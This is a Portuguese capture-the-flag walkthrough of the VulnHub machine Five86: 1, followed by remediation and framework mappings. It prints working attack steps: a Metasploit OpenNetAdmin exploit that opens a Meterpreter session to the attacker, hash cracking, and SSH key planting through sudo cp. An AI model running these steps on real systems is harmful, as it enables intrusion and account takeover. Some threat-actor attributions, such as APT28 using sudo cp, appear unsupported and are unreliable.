# Five86: 1 — Quatro Usuários, Um Root, Zero Misericórdia

Bora rapaziada!! Five86: 1 é o tipo de puzzle de movimento lateral que te ensina como a pós-exploração real funciona quando você precisa encadear através de múltiplos usuários antes de chegar ao root. O OpenNetAdmin te dá o shell inicial, um hash .htpasswd quebrável com crunch te dá o douglas, um abuso de sudo cp te dá a jen, um e-mail não criptografado te dá o moss, e um binário SUID customizado de game te dá o root. Quatro fronteiras de privilégio cruzadas usando quatro técnicas completamente diferentes. Design de máquina absolutamente sensacional, sem mentira.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | Five86: 1 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/five86-1,417/ |
| **Técnicas** | Nmap, robots.txt, fingerprint OpenNetAdmin, CVE-2019-26043 (ONA RCE), descoberta de credencial .htpasswd, wordlist direcionada com crunch, John the Ripper, abuso sudo cp para plantar chave SSH, vazamento de credencial via mail, escalação por binário SUID |
| **CVEs** | CVE-2019-26043 (OpenNetAdmin 18.1.1 RCE), CWE-269 (Gerenciamento Impróprio de Privilégio: sudo cp), CWE-312 (Armazenamento em Texto Claro: mail) |
| **Grupos APT** | APT28: usa RCE de aplicação web para acesso inicial e movimento lateral encadeado entre contas; FIN7: explora regras sudo mal configuradas como técnica primária de escalação de privilégio |

---

## Resumo do Ataque

```
nmap → HTTP/80 apenas
  → robots.txt → Disallow: /ona → OpenNetAdmin 18.1.1
  → searchsploit → EDB-47772 (ONA RCE) → Metasploit → www-data
  → /var/www/html/reports/.htaccess → AuthUserFile /var/www/.htpasswd
  → .htpasswd: douglas → hash + dica "10 chars de: aefhrt"
  → crunch 10 10 aefhrt → john → fatherrrrr
  → SSH douglas → sudo -l → (jen) NOPASSWD: /bin/cp
  → plantar chave SSH pública na authorized_keys da jen via sudo cp
  → SSH jen → /var/mail/jen → senha do moss
  → su moss → encontrar SUID /home/moss/.game/upyourgame
  → ./upyourgame → responder prompts → uid=0(root)
  → /root/flag.txt
```

---

## Metodologia

1. Scan de portas: apenas HTTP/80 aberto
2. robots.txt revela OpenNetAdmin em /ona
3. Fingerprint OpenNetAdmin 18.1.1, encontrar EDB-47772, exploração com Metasploit
4. Pós-exploração: .htaccess revela caminho do .htpasswd
5. .htpasswd: hash Apache MD5 com dica de conjunto de caracteres, crunch + John
6. SSH como douglas, enumerar sudo, abusar sudo cp para plantar chave SSH da jen
7. SSH como jen, ler /var/mail/jen para obter senha do moss
8. su moss, encontrar binário SUID customizado, executar game para obter root

---

## Passo 1 — Descoberta de Host e Scan de Portas

```bash
sudo netdiscover -r 192.168.0.0/24
# Alvo: 192.168.0.126

nmap -sV -sC -p- 192.168.0.126
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.x
```

Apenas HTTP aberto. Web é toda a superfície de ataque. Começar com enumeração.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web: robots.txt

```bash
curl http://192.168.0.126/robots.txt
```

```
User-agent: *
Disallow: /ona
```

Navegar para `http://192.168.0.126/ona`. O banner da aplicação mostra:

```
OpenNetAdmin 18.1.1
```

**Nota do mundo real:** robots.txt é para impedir indexação por mecanismos de busca, não para esconder conteúdo de atacantes. Segurança por obscuridade falha aqui: atacantes sempre verificam robots.txt. Entradas Disallow são um mapa para conteúdo interessante, não uma barreira.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — OpenNetAdmin RCE: CVE-2019-26043

```bash
searchsploit opennetadmin
# EDB-47772: OpenNetAdmin 18.1.1 — Remote Code Execution (Metasploit)

cp /usr/share/exploitdb/exploits/php/webapps/47772.rb \
  /usr/share/metasploit-framework/modules/exploits/unix/webapp/

msfconsole -q
msf> reload_all
msf> use exploit/unix/webapp/opennetadmin_ping_cmd_injection
msf> set RHOSTS 192.168.0.126
msf> set LHOST 192.168.0.132
msf> exploit
```

Sessão Meterpreter abre como `www-data`.

**O que é CVE-2019-26043?** A funcionalidade de ping do OpenNetAdmin passa input não sanitizado do usuário para um comando shell. O parâmetro `host` é injetado diretamente no comando do SO, permitindo execução arbitrária de comandos via injeção de comando OS clássica (CWE-78).

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Pública; T1059.004 — Interpretador de Comandos: Unix Shell

---

## Passo 4 — Descoberta de Credencial: .htpasswd

Da sessão Meterpreter:

```bash
shell
cat /var/www/html/reports/.htaccess
```

```
AuthUserFile /var/www/.htpasswd
AuthGroupFile /dev/null
AuthName "Restricted Content"
AuthType Basic
Require valid-user
```

```bash
cat /var/www/.htpasswd
```

```
douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1
# Nota no arquivo: password is 10 chars made from: aefhrt
```

O criador embutiu uma dica de wordlist dentro do próprio arquivo de credencial. Caramba. Isso reduz drasticamente o espaço de busca.

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos

---

## Passo 5 — Quebrar Hash .htpasswd

O tipo de hash é Apache MD5 (`$apr1$`), que é o modo 1600 no Hashcat / formato md5crypt no John.

Gerar a wordlist direcionada com crunch:

```bash
crunch 10 10 aefhrt -o /root/five86_dict.txt
# Gera todas as combinações de 10 caracteres usando apenas: a, e, f, h, r, t
# Keyspace: 6^10 = 60.466.176 candidatos (~60M palavras)
```

Quebrar com John:

```bash
echo 'douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1' > /root/five86_hash.txt
john --wordlist=/root/five86_dict.txt /root/five86_hash.txt
```

**Senha recuperada:** `fatherrrrr`

**MITRE ATT&CK:** T1110.002 — Força Bruta: Quebra de Senha

---

## Passo 6 — SSH como douglas: Abusar sudo cp

```bash
ssh douglas@192.168.0.126
# Senha: fatherrrrr

sudo -l
```

```
(jen) NOPASSWD: /bin/cp
```

Douglas pode rodar `/bin/cp` como usuário `jen` sem senha. Isso permite copiar qualquer arquivo para qualquer localização que `jen` possua. O alvo: plantar uma chave SSH pública na `~/.ssh/authorized_keys` da jen.

```bash
# No atacante: gerar par de chaves
ssh-keygen -t rsa -f /root/.ssh/id_rsa_five86 -N ""

# Copiar chave pública para o alvo
scp /root/.ssh/id_rsa_five86.pub douglas@192.168.0.126:/tmp/authorized_keys
```

No alvo como douglas:

```bash
sudo -u jen /bin/cp /tmp/authorized_keys /home/jen/.ssh/authorized_keys
```

SSH como jen:

```bash
ssh -i /root/.ssh/id_rsa_five86 jen@192.168.0.126
```

**Nota do mundo real:** Concessões sudo para utilitários de cópia de arquivo (cp, tee, install, dd) são tão perigosas quanto sudo para shell. Cada uma permite sobrescrever arquivos do sistema ou plantar backdoors. APT28 usou abuso de sudo cp para plantar chaves SSH em fases de movimento lateral.

**MITRE ATT&CK:** T1548.003 — Abuso de Controle de Elevação: Sudo; T1098.004 — Manipulação de Conta: SSH Authorized Keys

---

## Passo 7 — Movimento Lateral: jen para moss via Mail

O banner de login SSH mostra novo mail para jen:

```bash
cat /var/mail/jen
```

```
De: moss
Assunto: Seus novos detalhes de conta

Oi jen,

Aqui estão seus dados de login para o novo sistema:
moss:...
Senha: ...
```

O e-mail divulga a senha do moss em texto claro.

```bash
su - moss
# Inserir senha do e-mail
```

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos; T1020 — Exfiltração Automatizada

---

## Passo 8 — Escalação de Privilégio: moss para root via Binário SUID

```bash
find / -perm -u=s -type f 2>/dev/null
# /home/moss/.game/upyourgame

cd /home/moss/.game
./upyourgame
```

O binário apresenta uma série de perguntas SIM/NÃO. Respondendo corretamente, um shell root é spawned:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt
```

Root capturado. GG rapaziada!

**MITRE ATT&CK:** T1548.001 — Abuso de Controle de Elevação: Setuid

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado em | Usado Para |
|---|---|---|---|
| Hash de credencial | douglas:$apr1$9fgG/hiM$... | /var/www/.htpasswd | John + crunch → fatherrrrr |
| Credencial | douglas:fatherrrrr | Quebra .htpasswd | Login SSH |
| Chave SSH | id\_rsa\_five86 | Gerada no atacante | SSH como jen via sudo cp |
| Credencial | moss:... | /var/mail/jen | su - moss |
| Flag root | flag.txt | /root/flag.txt | Capturada |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Conclusão |
|---|---|---|---|
| 1 | robots.txt revela aplicação interna | robots.txt é um mapa para atacantes, não controle de segurança | Remover caminhos sensíveis do robots.txt; usar autenticação adequada para apps internas |
| 2 | OpenNetAdmin 18.1.1 injeção de comando OS (CVE-2019-26043) | Aplicações de gerenciamento de rede são alvos de alto valor; frequentemente rodam com privilégios elevados e têm CVEs conhecidos | Manter todas as aplicações web com patches; remover ou isolar ferramentas internas |
| 3 | .htpasswd contém dica de wordlist em comentário em texto claro | Arquivos de credencial nunca devem conter metadados que reduzam o tempo de quebra | Remover todos os comentários do .htpasswd; usar bcrypt com fator de custo alto |
| 4 | sudo cp concede escrita no home de outro usuário | Utilitários de cópia com sudo permitem plantar backdoor SSH sem senha | Remover todas as concessões sudo para utilitários de cópia de arquivo |
| 5 | Credenciais enviadas via e-mail em texto claro | Distribuição de credenciais por e-mail é um achado consistente de pós-exploração | Usar canais seguros; criptografar e-mail; nunca enviar senhas via e-mail |
| 6 | Binário SUID customizado roda como root com input controlável pelo usuário | Binários SUID com comportamento controlável pelo usuário são candidatos a escalação de privilégio | Auditar todos os binários SUID; remover o bit SUID de utilitários customizados |

---

## MITRE ATT&CK

| Fase | Tática | Técnica | ID |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública (ONA RCE) | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos (.htpasswd) | T1552.001 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Quebra de Senha | T1110.002 |
| Execução | Execução | Interpretador de Comandos: Unix Shell | T1059.004 |
| Movimento Lateral | Escalação de Privilégio | Abuso de Controle de Elevação: Sudo (cp) | T1548.003 |
| Movimento Lateral | Movimento Lateral | Manipulação de Conta: SSH Authorized Keys | T1098.004 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos (mail) | T1552.001 |
| Escalação de Privilégio | Escalação de Privilégio | Abuso de Controle de Elevação: Setuid | T1548.001 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Atualizar ou remover OpenNetAdmin** — CVE-2019-26043 está corrigido em versões posteriores; se ONA não é necessário, remover completamente
2. **Remover dicas de credencial do .htpasswd** — nunca embutir comentários com dicas de conjunto de caracteres; usar bcrypt com fator de custo alto
3. **Remover concessões sudo para cp e utilitários similares** — utilitários de cópia com sudo são equivalentes a acesso de escrita em todo o sistema de arquivos
4. **Desabilitar auth SSH por senha; distribuir chaves de forma segura** — nunca enviar senhas SSH via e-mail; usar solução PAM ou SSH CA
5. **Auditar e remover SUID de binários customizados** — nenhum binário customizado deve ter o bit SUID sem auditoria

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar todas as aplicações web; rastrear versões contra CVEs |
| Proteger | Controle de Acesso | Remover sudo cp; restringir bits SUID; desabilitar distribuição de credenciais por e-mail |
| Proteger | Segurança de Dados | Remover comentários .htpasswd; sem credenciais em mail |
| Detectar | Anomalias e Eventos | Alertar em uso sudo para cópia; detectar adições de chave em authorized\_keys |
| Responder | Planejamento de Resposta | Corrigir ONA; rotacionar todas as credenciais da cadeia; auditar authorized\_keys |
| Recuperar | Planejamento de Recuperação | Reconstruir host comprometido; auditar todos os usuários e chaves SSH |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Controle de Acesso | Remover sudo cp; restringir bits SUID |
| AC-6 | Mínimo Privilégio | Sem utilitários de cópia no sudoers; sem binários SUID customizados |
| IA-5 | Gerenciamento de Autenticadores | Sem credenciais em e-mail; usar SSH CA ou Vault para distribuição de chaves |
| CM-7 | Funcionalidade Mínima | Remover ONA se não utilizado; desabilitar serviços não necessários |
| SC-28 | Proteção de Informação em Repouso | Sem credenciais em comentários .htpasswd ou arquivos de mail |
| SA-11 | Testes de Segurança no Desenvolvimento | Revisão de código para escalação de privilégio SUID em binários customizados |

### CISA KEV

CVE-2019-26043 (OpenNetAdmin RCE) é uma classe de vulnerabilidade de exploração ativa conhecida. Organizações rodando OpenNetAdmin são aconselhadas a aplicar patches ou remover a aplicação.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Gerenciar Vulnerabilidades | MIL2 |
| Gestão de Ativos, Mudanças e Configurações (ASSET) | Gerenciar Inventário de Ativos de TI | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicação (corrigir ONA; senhas bcrypt; remover sudo cp)
- **D3-OAM** — Gerenciamento Administrativo do SO (auditar SUID; restringir sudo)
- **D3-NM** — Monitoramento de Rede (detectar movimento lateral entre contas de usuário)

---

## Considerações Finais

Véi, Five86: 1 é uma aula magistral de movimento lateral encadeado. Cada técnica aqui (ONA RCE, quebra de .htpasswd, abuso de sudo cp plantando chave SSH, vazamento de credencial via mail, binário SUID) é um achado do mundo real com impacto real. A máquina ensina a disciplina de verificar sudo rights, buscar binários SUID e ler arquivos de mail em cada nível de privilégio. Cada conta de usuário é uma fronteira, e cada fronteira tem um bypass diferente. É exatamente assim que a pós-exploração real em um sistema Linux multiusuário se parece. Valor de treinamento de altíssimo nível, rapaziada.

Thanks guys!! (❍ᴥ❍ʋ)
